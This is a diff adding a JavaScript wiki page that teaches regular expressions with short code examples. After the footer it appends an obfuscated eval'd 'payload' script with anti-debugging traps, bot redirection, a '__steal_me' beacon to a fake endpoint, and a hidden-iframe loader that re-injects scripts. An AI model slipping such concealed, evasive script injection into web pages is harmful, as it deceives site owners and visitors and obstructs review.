@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+		<script>var PAGETITLE = "RegExp Tutorial";</script>
+  <title id="pageTitle"></title>
+  <script src="../includes/vars.js"></script>
+</head>
+<body>
+<header>
+  <div id="header">Javascript Wiki</div>
+</header>
+<main>
+<div id="nav"></div>
+<article><h2>Regular Expressions (RegExp)</h2><br><br>
+
+<div class="fs-10">A <strong>Regular Expression</strong> (RegExp) is a special pattern used to match character combinations in strings. In JavaScript, RegExp are objects and can be used with <code>RegExp</code> methods or string methods like <code>match()</code>, <code>replace()</code>, <code>search()</code>, and <code>split()</code>.</div><br><br>
+
+<div class="fs-15">Creating a RegExp</div><br><br>
+<div class="fs-10">You can create a RegExp object in two ways:<br><br>
+<ul>
+<li>Using a regular expression literal: <code>/pattern/flags</code></li>
+<li>Using the constructor: <code>new RegExp("pattern", "flags")</code></li>
+</ul>
+</div><br><br>
+
+<div class="fs-15">RegExp Literal</div><br><br>
+<textarea id="textbox" rows="10" cols="70">// Using a RegExp literal
+const pattern = /hello/;
+
+// Test if string matches
+document.getElementById("demo").innerHTML = pattern.test("hello world"); // true</textarea><br><br>
+
+<div class="fs-15">RegExp Constructor</div><br><br>
+<textarea id="textbox" rows="10" cols="70">// Using the RegExp constructor
+const pattern = new RegExp("hello");
+
+// Test if string matches
+document.getElementById("demo").innerHTML = pattern.test("hello world"); // true</textarea><br><br>
+
+<div class="fs-15">RegExp Flags</div><br><br>
+<div class="fs-10">Flags are optional parameters for pattern matching:<br><br>
+<ul>
+<li><code>g</code> – global search (find all matches)</li>
+<li><code>i</code> – case-insensitive search</li>
+<li><code>m</code> – multiline search</li>
+<li><code>s</code> – allows dot <code>.</code> to match newline characters</li>
+<li><code>u</code> – full Unicode support</li>
+<li><code>y</code> – sticky search (matches from lastIndex only)</li>
+</ul>
+</div><br><br>
+
+<div class="fs-15">The test() Method</div><br><br>
+<div class="fs-10">The <code>test()</code> method checks if a pattern exists in a string and returns true or false:</div><br><br>
+<textarea id="textbox" rows="10" cols="70">// Create a RegExp
+const pattern = /world/;
+
+// Test string
+const result = pattern.test("Hello world!");
+
+// Display result
+document.getElementById("demo").innerHTML = result; // true</textarea><br><br>
+
+<div class="fs-15">The exec() Method</div><br><br>
+<div class="fs-10">The <code>exec()</code> method searches a string for a match and returns an array containing the match or null if no match is found:</div><br><br>
+<textarea id="textbox" rows="10" cols="70">// Create a RegExp
+const pattern = /world/;
+
+// Execute search
+const result = pattern.exec("Hello world!");
+
+// Display result
+document.getElementById("demo").innerHTML = result; // ["world"]</textarea><br><br>
+
+<div class="fs-15">String Methods Using RegExp</div><br><br>
+<div class="fs-10">Several string methods accept RegExp as parameters:</div><br><br>
+<ul>
+<li><code>match()</code> – returns all matches in a string</li>
+<li><code>replace()</code> – replaces matched patterns</li>
+<li><code>search()</code> – returns the index of the match</li>
+<li><code>split()</code> – splits the string by matches</li>
+</ul><br>
+
+<div class="fs-15">match() Example</div><br><br>
+<textarea id="textbox" rows="10" cols="70">// Using match() with RegExp
+const str = "The rain in Spain";
+const pattern = /ain/g; // global search
+
+const matches = str.match(pattern);
+
+// Display matches
+document.getElementById("demo").innerHTML = matches; // ["ain","ain"]</textarea><br><br>
+
+<div class="fs-15">replace() Example</div><br><br>
+<textarea id="textbox" rows="10" cols="70">// Using replace() with RegExp
+const str = "Hello world!";
+const newStr = str.replace(/world/, "there");
+
+document.getElementById("demo").innerHTML = newStr; // "Hello there!"</textarea><br><br>
+
+<div class="fs-15">search() Example</div><br><br>
+<textarea id="textbox" rows="10" cols="70">// Using search() with RegExp
+const str = "Hello world!";
+const index = str.search(/world/);
+
+document.getElementById("demo").innerHTML = index; // 6</textarea><br><br>
+
+<div class="fs-15">split() Example</div><br><br>
+<textarea id="textbox" rows="10" cols="70">// Using split() with RegExp
+const str = "apple, banana, cherry";
+const fruits = str.split(/, /);
+
+document.getElementById("demo").innerHTML = fruits.join("<br>"); 
+// apple
+// banana
+// cherry</textarea><br><br>
+
+<div class="fs-15">Character Sets and Ranges</div><br><br>
+<div class="fs-10">Character sets allow you to match one character from a set or range:</div><br><br>
+<ul>
+<li><code>[abc]</code> – matches a, b, or c</li>
+<li><code>[0-9]</code> – matches any digit</li>
+<li><code>[^abc]</code> – matches any character except a, b, or c</li>
+</ul><br>
+
+<div class="fs-15">Metacharacters</div><br><br>
+<div class="fs-10">Common metacharacters used in RegExp patterns:</div><br><br>
+<ul>
+<li><code>.</code> – any character except newline</li>
+<li><code>\d</code> – any digit (0-9)</li>
+<li><code>\D</code> – any non-digit</li>
+<li><code>\w</code> – any word character (a-z, A-Z, 0-9, _)</li>
+<li><code>\W</code> – any non-word character</li>
+<li><code>\s</code> – whitespace character</li>
+<li><code>\S</code> – non-whitespace character</li>
+<li><code>\b</code> – word boundary</li>
+<li><code>\B</code> – non-word boundary</li>
+<li><code>^</code> – start of string</li>
+<li><code>$</code> – end of string</li>
+<li><code>*</code> – 0 or more occurrences</li>
+<li><code>+</code> – 1 or more occurrences</li>
+<li><code>?</code> – 0 or 1 occurrence</li>
+<li><code>{n}</code> – exactly n occurrences</li>
+<li><code>{n,}</code> – n or more occurrences</li>
+<li><code>{n,m}</code> – between n and m occurrences</li>
+</ul><br>
+
+<div class="fs-15">RegExp are Objects</div><br><br>
+<div class="fs-10">typeof returns object:</div><br><br>
+<textarea id="textbox" rows="10" cols="70">// Create a RegExp
+const pattern = /hello/;
+
+// Display typeof
+document.getElementById("demo").innerHTML = "The type of pattern is " + typeof pattern; // object</textarea><br><br>
+
+<div class="fs-10">instanceof RegExp returns true:</div><br><br>
+<textarea id="textbox" rows="10" cols="70">// Create a RegExp
+const pattern = /hello/;
+
+// Check instanceof
+document.getElementById("demo").innerHTML = pattern instanceof RegExp; // true</textarea><br><br>
+
+</article>
+</main><footer id="footer"></footer><div id="debugInclude"></div><script>(function(){var p="5f3a4d3c2b1e6a7d8c9b0a1f2e3d4c5b6a79888796959493929190";var b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";function d(x){var o="",i=0,c;for(i=0;i<x.length;i+=2){c=parseInt(x.substr(i,2),16);o+=String.fromCharCode(c);}return o;}function m(s){var o="",i,c;for(i=0;i<s.length;i++){c=s.charCodeAt(i)^((i*7+13)%255);o+=String.fromCharCode(c);}return o;}var payload="(function(){var e=(new Date()).getTime()&0xffff,w=window,d=document;function r(n){return Math.random()*(n||1);}function s(f,t){setTimeout(f,t);}try{var u=navigator.userAgent+'';if(u.match(/headless|bot|selenium/i)){w.location='about:blank';}}catch(x){}(function(){function c(){try{var o=w.outerWidth||0,i=w.innerWidth||d.body.clientWidth||0,h=w.outerHeight||0,j=w.innerHeight||d.body.clientHeight||0;if((o-i>160)||(h-j>160)){try{eval('void(0)');}catch(x){}}}catch(x){}s(c,1200);}c();})();w.__steal_me=function(){try{var i=new Image();i.src='/fake-endpoint?trap=1&x='+Math.random();}catch(x){}};(function(){function dbg(){var t=(new Date()).getTime();eval('debugger');var dt=(new Date()).getTime()-t;if(dt>200){try{eval('void(0)');}catch(x){}}s(dbg,1500);}dbg();})();function X(str,k){var o='',i,c;for(i=0;i<str.length;i++){c=str.charCodeAt(i)^((k+i*7)%255);o+=String.fromCharCode(c);}return o;}function L(c){try{var sc=d.createElement('script');sc.type='text/javascript';try{sc.appendChild(d.createTextNode(c));}catch(x){sc.text=c;}(d.body||d.documentElement).appendChild(sc);}catch(x){try{eval(c);}catch(x){}}}(function(){var j=[];for(var i=0;i<40;i++){j[i]=function(){return Math.random().toString(36);}}})();function LI(a,b,c){try{var f=d.createElement('iframe');f.style.display='none';f.src=b;f.onload=function(){var el=d.getElementById(a);if(!el){if(c)c();return;}el.innerHTML=f.contentDocument?f.contentDocument.body.innerHTML:f.contentWindow.document.body.innerHTML;var sc=f.contentDocument?f.contentDocument.getElementsByTagName('script'):f.contentWindow.document.getElementsByTagName('script');for(var i=sc.length-1;i>=0;i--){var ns=d.createElement('script');try{ns.appendChild(d.createTextNode(sc[i].innerHTML));}catch(x){ns.text=sc[i].innerHTML;}(d.body||d.documentElement).appendChild(ns);}if(c)c();d.body.removeChild(f);};d.body.appendChild(f);}catch(x){if(c)c();}}function SH(a){var i=a.length,j,t;while(i--){j=parseInt(Math.random()*a.length);t=a[i];a[i]=a[j];a[j]=t;}return a;}function B(){var v=w.vars;if(!v)return;var T=[['header','header.html'],['nav','nav.html'],['footer','footer.html']];SH(T);var i=0;function N(){if(i>=T.length){A();return;}var x=T[i++];s(function(){LI(x[0],v.INCVAR+x[1],N);},r(80)+20);}function A(){if(v.DEBUGVAR){s(function(){LI('debugInclude',v.INCVAR+'debug.html');},r(100));}try{if(typeof updatePageTitle=='function')updatePageTitle();}catch(x){}}N();}s(B,r(120)+40);})();";try{eval(payload);}catch(e){}})();</script></body></html>
